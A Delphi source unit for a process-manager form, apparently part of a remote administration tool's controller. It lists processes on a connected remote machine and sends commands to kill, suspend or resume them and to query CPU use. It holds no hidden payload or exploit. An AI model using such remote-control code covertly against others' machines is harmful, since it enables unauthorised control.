unit UnitProcessos;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ImgList, Menus, UnitMain, UnitConexao, sSkinProvider;

type
  TFormProcessos = class(TForm)
    StatusBar1: TStatusBar;
    AdvListView1: TListView;
    PopupMenu1: TPopupMenu;

    Atualizar1: TMenuItem;
    N1: TMenuItem;
    Finalizar1: TMenuItem;
    Pausar1: TMenuItem;
    Continuar1: TMenuItem;
    CPU1: TMenuItem;
    Abrirlocaldoarquivo1: TMenuItem;
    sSkinProvider1: TsSkinProvider;
    procedure FormCreate(Sender: TObject);
    procedure Atualizar1Click(Sender: TObject);
    procedure Abrirlocaldoarquivo1Click(Sender: TObject);
    procedure AdvListView1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure FormShow(Sender: TObject);
    procedure AdvListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure AdvListView1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure Finalizar1Click(Sender: TObject);
    procedure Pausar1Click(Sender: TObject);
    procedure Continuar1Click(Sender: TObject);
    procedure CPU1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    NomePC: string;
    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdioma;
  	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

var
  FormProcessos: TFormProcessos;

implementation

{$R *.dfm}

uses
  UnitConstantes,
  UnitStrings,
  CustomIniFiles,
  DateUtils,
  ShellAPI,
  UnitFileManager,
  UnitCommonProcedures,
  UnitAll;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormProcessos.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdioma;
end;  

procedure TFormProcessos.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormProcessos.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  if FormMain.ControlCenter = True then Exit;
  Params.WndParent := GetDesktopWindow;
end;

var
  LastSortedColumn: TListColumn;
  Ascending: boolean;

procedure TFormProcessos.Continuar1Click(Sender: TObject);
var
  i: integer;
begin
  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if (AdvListView1.Items.Item[i].SubItems.Strings[0] <> '') and (AdvListView1.Items.Item[i].Selected = true) then
    Servidor.EnviarString(RESUMEPROCESSID + '|' + AdvListView1.Items.Item[i].SubItems.Strings[0] + '|');
  end;
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormProcessos.CPU1Click(Sender: TObject);
var
  i: integer;
begin
  if AdvListView1.Selected = nil then Exit;
  try
    i := StrToInt(AdvListView1.Selected.SubItems[0]);
    except
    i := 0;
  end;
  if i > 0 then Servidor.EnviarString(CPUUSAGE + '|' + IntToStr(i) + '|');
end;

constructor TFormProcessos.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    Width := IniFile.ReadInteger('ProcessManager', 'Width', Width);
    Height := IniFile.ReadInteger('ProcessManager', 'Height', Height);
    Left := IniFile.ReadInteger('ProcessManager', 'Left', Left);
    Top := IniFile.ReadInteger('ProcessManager', 'Top', Top);
    AdvListView1.Column[0].Width := IniFile.ReadInteger('ProcessManager', 'LV1_0', AdvListView1.Column[0].Width);
    AdvListView1.Column[1].Width := IniFile.ReadInteger('ProcessManager', 'LV1_1', AdvListView1.Column[1].Width);
    AdvListView1.Column[2].Width := IniFile.ReadInteger('ProcessManager', 'LV1_2', AdvListView1.Column[2].Width);
    AdvListView1.Column[3].Width := IniFile.ReadInteger('ProcessManager', 'LV1_3', AdvListView1.Column[3].Width);
    AdvListView1.Column[4].Width := IniFile.ReadInteger('ProcessManager', 'LV1_4', AdvListView1.Column[4].Width);
    AdvListView1.Column[5].Width := IniFile.ReadInteger('ProcessManager', 'LV1_5', AdvListView1.Column[5].Width);
    AdvListView1.Column[6].Width := IniFile.ReadInteger('ProcessManager', 'LV1_6', AdvListView1.Column[6].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;

function SortByColumn(Item1, Item2: TListItem; Data: integer): integer; stdcall;
var
  n1,n2: int64;
  s1,s2: string;
  ex1,ex2: extended;
  num: integer;
  Date1,Date2: TDateTime;
begin
  if (LastSortedColumn.Index = 1) or
     (LastSortedColumn.Index = 4) or
     (LastSortedColumn.Index = 5) or
     (LastSortedColumn.Index = 6) then
  begin
    if LastSortedColumn.Index = 1 then
    begin
       n1 := StrToIntDef(Item1.SubItems[0],0);
       n2 := StrToIntDef(Item2.SubItems[0],0);
    end;

     if LastSortedColumn.Index = 4 then
     begin
       n1 := StrToIntDef(Item1.SubItems[3], 0);
       n2 := StrToIntDef(Item2.SubItems[3], 0);
     end;

     if LastSortedColumn.Index = 5 then
     begin
       n1 := StrToIntDef(IntToStr(Int64(Item1.SubItems.Objects[4])),0);
       n2 := StrToIntDef(IntToStr(Int64(Item2.SubItems.Objects[4])),0);
     end;

    if LastSortedColumn.Index = 6 then
    begin
      try
        Date1 := StrToDateTime(Copy(Item1.SubItems[5], 1, posex(' ', Item1.SubItems[5]) - 1));
        except
      end;
      try
        Date2 := StrToDateTime(Copy(Item2.SubItems[5], 1, posex(' ', Item2.SubItems[5]) - 1));
        except
      end;
      Result := CompareDateTime(Date1, Date2);
      if not Ascending then Result := - Result;
      exit;
    end;
    if (n1 = n2) then Result := 0 else if (n1 > n2) then Result := 1 else Result := -1;

  end else
  begin
    Result := 0;
    if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption)
    else Result := AnsiCompareText(Item1.SubItems[Data-1],Item2.SubItems[Data-1]);
  end;

  if not Ascending then Result := -Result;
end;

procedure TFormProcessos.AtualizarIdioma;
begin
  AdvListView1.Column[0].Caption := traduzidos[185];
  AdvListView1.Column[1].Caption := traduzidos[186];
  AdvListView1.Column[2].Caption := traduzidos[187];
  AdvListView1.Column[3].Caption := traduzidos[188];
  AdvListView1.Column[4].Caption := traduzidos[189];
  AdvListView1.Column[5].Caption := traduzidos[190];
  AdvListView1.Column[6].Caption := traduzidos[191];

  Atualizar1.Caption := traduzidos[192];
  Pausar1.Caption := traduzidos[193];
  Continuar1.Caption := traduzidos[194];
  Finalizar1.Caption := traduzidos[195];
  Abrirlocaldoarquivo1.Caption := traduzidos[196];
end;

procedure TFormProcessos.Abrirlocaldoarquivo1Click(Sender: TObject);
var
  NovaJanelaFileManager: TFormFileManager;
  i: integer;
  key: Char;
begin
  FormMain.AbrirFileManager(Servidor);
  TFormAll(Servidor.FormAll).Width := TFormAll(Servidor.FormAll).Width + 1;
  TFormAll(Servidor.FormAll).Width := TFormAll(Servidor.FormAll).Width - 1;
  NovaJanelaFileManager := TFormFileManager(Servidor.FormFileManager);

  while (NovaJanelaFileManager.Visible = True) and
        (NovaJanelaFileManager.TreeView1.Enabled = False) do
  begin
    Application.ProcessMessages;
    sleep(10);
  end;
  NovaJanelaFileManager.ComboBox1.Text := ExtractFilePath(AdvListView1.Selected.SubItems[1]);
  key := #13;
  NovaJanelaFileManager.ComboBox1KeyPress(nil, Key);
end;

procedure TFormProcessos.Atualizar1Click(Sender: TObject);
begin
  Servidor.EnviarString(GETPROCESSLIST + '|');
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormProcessos.Finalizar1Click(Sender: TObject);
var
  i: integer;
begin
  if AdvListView1.SelCount <= 0 then Exit;
  if MessageBox(Handle,
                pchar(traduzidos[206] + '?'),
                pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_ICONQUESTION or MB_YESNO or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST)  <> idYes then Exit;

  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if (AdvListView1.Items.Item[i].SubItems.Strings[0] <> '') and (AdvListView1.Items.Item[i].Selected = true) then
    Servidor.EnviarString(KILLPROCESSID + '|' + AdvListView1.Items.Item[i].SubItems.Strings[0] + '|');
  end;
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormProcessos.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  if LiberarForm then Action := caFree;

  AdvListView1.Items.Clear;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('ProcessManager', 'Width', Width);
    IniFile.WriteInteger('ProcessManager', 'Height', Height);
    IniFile.WriteInteger('ProcessManager', 'Left', Left);
    IniFile.WriteInteger('ProcessManager', 'Top', Top);
    IniFile.WriteInteger('ProcessManager', 'LV1_0', AdvListView1.Column[0].Width);
    IniFile.WriteInteger('ProcessManager', 'LV1_1', AdvListView1.Column[1].Width);
    IniFile.WriteInteger('ProcessManager', 'LV1_2', AdvListView1.Column[2].Width);
    IniFile.WriteInteger('ProcessManager', 'LV1_3', AdvListView1.Column[3].Width);
    IniFile.WriteInteger('ProcessManager', 'LV1_4', AdvListView1.Column[4].Width);
    IniFile.WriteInteger('ProcessManager', 'LV1_5', AdvListView1.Column[5].Width);
    IniFile.WriteInteger('ProcessManager', 'LV1_6', AdvListView1.Column[6].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;

procedure TFormProcessos.FormCreate(Sender: TObject);
begin
  AdvListView1.SmallImages := FormMain.SuperImageList;
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
end;

procedure TFormProcessos.FormShow(Sender: TObject);
begin
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
  AtualizarIdioma;
  Atualizar1Click(Atualizar1);
end;

function GetImageIndex(FileName: string): integer;
var
  SHFileInfo: TSHFileInfo;
begin
  result := - 1;
  try
    SHGetFileInfo(PChar(FileName),
      FILE_ATTRIBUTE_NORMAL, SHFileInfo,
      SizeOf(SHFileInfo),
      SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES or SHGFI_SYSICONINDEX);
    Result := SHFileInfo.iIcon;
    finally
    if Result <= 0 then result := - 1;
  end;
end;

procedure TFormProcessos.AdvListView1ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  Ascending := not Ascending;
  if Column <> LastSortedColumn then Ascending := not Ascending;
  for i := 0 to AdvListview1.Columns.Count -1 do AdvListview1.Column[i].ImageIndex := -1;
  LastSortedColumn := Column;
  AdvListview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TFormProcessos.AdvListView1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then
  begin
    Sender.Canvas.Font.Color := TColor(Item.Data);
  end;
end;

procedure TFormProcessos.AdvListView1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if key = VK_DELETE then Finalizar1Click(Finalizar1);
end;

procedure TFormProcessos.OnRead(Recebido: String; ConAux: TConexaoNew);
var
  TempInt, TempInt1: Int64;
  Item: TListItem;
  TempStr: string;
  i: integer;
  Result: TSplit;
begin
  if Copy(Recebido, 1, posex('|', Recebido) - 1) = GETPROCESSLIST then
  begin
    if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
    AdvListView1.Items.BeginUpdate;
    try
      Delete(Recebido, 1, posex('|', Recebido));

      TempInt := StrToInt64(Copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1));
      Delete(Recebido, 1, (posex(DelimitadorComandos, Recebido) - 1));
      Delete(Recebido, 1, length(DelimitadorComandos));

      while (Recebido <> '') and (Visible = True) do
      begin
        TempStr := Copy(Recebido, 1, posex(#13#10, Recebido));
        Delete(Recebido, 1, posex(#13#10, Recebido) + 1);
        Item := AdvListView1.Items.Add;
        Result := SplitString(TempStr, DelimitadorComandos);

        Item.Caption := Result[0];
        if Result[1] = IntToStr(TempInt) then Item.Data := TObject(clRed);
        Item.SubItems.Add(Result[1]);
        Item.SubItems.Add(Result[2]);
        Item.SubItems.Add(Result[3]);
        Item.SubItems.Add(Result[4]);
        try
          TempInt1 := StrToInt64(Result[5]);
          except
          TempInt1 := 0;
        end;
        if TempInt1 = 0 then Item.SubItems.Add('') else
        Item.SubItems.AddObject(FileSizeToStr(TempInt1), TObject(TempInt1));
        Item.SubItems.Add(Result[6]);
        Item.SubItems.Add('');

        if FileExists(Item.SubItems.Strings[1]) = true then
        Item.ImageIndex := GetImageIndex(Item.SubItems.Strings[1]) else Item.ImageIndex := GetImageIndex('*' + ExtractFileExt(Item.Caption));
      end;
      finally
      AdvListView1.Items.EndUpdate;
    end;

    Item := nil;

    for I := AdvListView1.Items.Count - 1 downto 0 do
    begin
      try
        TempInt := StrToInt(AdvListView1.Items.Item[i].SubItems[0]);
        except
        continue;
      end;

      if TempInt > 0 then
      begin
        if (AdvListView1.Items.Item[i].Data <> nil) and (AdvListView1.Items.Item[i].Data = TObject(clRed)) then
        begin
          Item := AdvListView1.Items.Item[i];
          Continue;
        end;
        Servidor.EnviarString(CPUUSAGE + '|' + IntToStr(TempInt) + '|');
        sleep(50);
      end;
    end;

    if Item <> nil then
    begin
      sleep(1000);
      Servidor.EnviarString(CPUUSAGE + '|' + Item.SubItems[0] + '|');
    end;

    StatusBar1.Panels.Items[0].Text := traduzidos[197];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = KILLPROCESSID then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;

    try
      AdvListView1.Items.BeginUpdate;
      for i := 0 to AdvListView1.Items.Count - 1 do
      if (AdvListView1.Items.Item[i].SubItems.Strings[0] = IntToStr(TempInt)) and (TempStr = 'T') then
      begin
        AdvListView1.Items.Item[i].Delete;
        break;
      end;
      finally
      AdvListView1.Items.EndUpdate;
    end;

    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[198] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[199] else
    StatusBar1.Panels.Items[0].Text := traduzidos[198] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[200];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = SUSPENDPROCESSID then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;

    try
      for i := 0 to AdvListView1.Items.Count - 1 do
      if (AdvListView1.Items.Item[i].SubItems.Strings[0] = IntToStr(TempInt)) and (TempStr = 'T') then
      AdvListView1.Items.Item[i].Data := TObject(clGray);
      except
    end;
    AdvListView1.Refresh;

    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[198] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[201] else
    StatusBar1.Panels.Items[0].Text := traduzidos[198] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[202];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = RESUMEPROCESSID then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;

    try
      for i := 0 to AdvListView1.Items.Count - 1 do
      if (AdvListView1.Items.Item[i].SubItems.Strings[0] = IntToStr(TempInt)) and (TempStr = 'T') then
      AdvListView1.Items.Item[i].Data := TObject(clBlack);
      except
    end;
    AdvListView1.Refresh;

    if (TempInt <> 0) and (TempStr = 'T') then
    StatusBar1.Panels.Items[0].Text := traduzidos[198] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[203] else
    StatusBar1.Panels.Items[0].Text := traduzidos[198] + ' ' + IntToStr(TempInt) + ' ' + traduzidos[204];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = CPUUSAGE then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    try
      TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
      except
      TempInt := 0;
    end;
    if TempInt <= 0 then Exit;
    delete(Recebido, 1, posex('|', Recebido));

    for I := AdvListView1.Items.Count - 1 downto 0 do
    if IntToStr(TempInt) = AdvListView1.Items.Item[i].SubItems[0] then
    begin
      AdvListView1.Items.Item[i].SubItems[6] := Copy(Recebido, 1, posex('|', Recebido) - 1);
      break;
    end;
  end else


end;

procedure TFormProcessos.Pausar1Click(Sender: TObject);
var
  i: integer;
begin
  if AdvListView1.SelCount <= 0 then Exit;
  if MessageBox(Handle,
                pchar(traduzidos[207] + '?'),
                pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_ICONQUESTION or MB_YESNO or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then Exit;

  for i := AdvListView1.Items.Count - 1 downto 0 do
  begin
    if (AdvListView1.Items.Item[i].SubItems.Strings[0] <> '') and (AdvListView1.Items.Item[i].Selected = true) then
    Servidor.EnviarString(SUSPENDPROCESSID + '|' + AdvListView1.Items.Item[i].SubItems.Strings[0] + '|');
  end;
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormProcessos.PopupMenu1Popup(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to PopupMenu1.Items.Count - 1 do PopupMenu1.Items.Items[i].Enabled := false;
  if AdvListView1.Selected = nil then
  Atualizar1.Enabled := true else
  for i := 0 to PopupMenu1.Items.Count - 1 do PopupMenu1.Items.Items[i].Enabled := true;
  CPU1.Enabled := AdvListView1.SelCount = 1;

  AbrirLocalDoArquivo1.Enabled := (AdvListView1.SelCount = 1) and
                                  (AdvListView1.Selected.SubItems[1] <> '') and
                                  (posex(':\', AdvListView1.Selected.SubItems[1]) > 0);

end;

end.
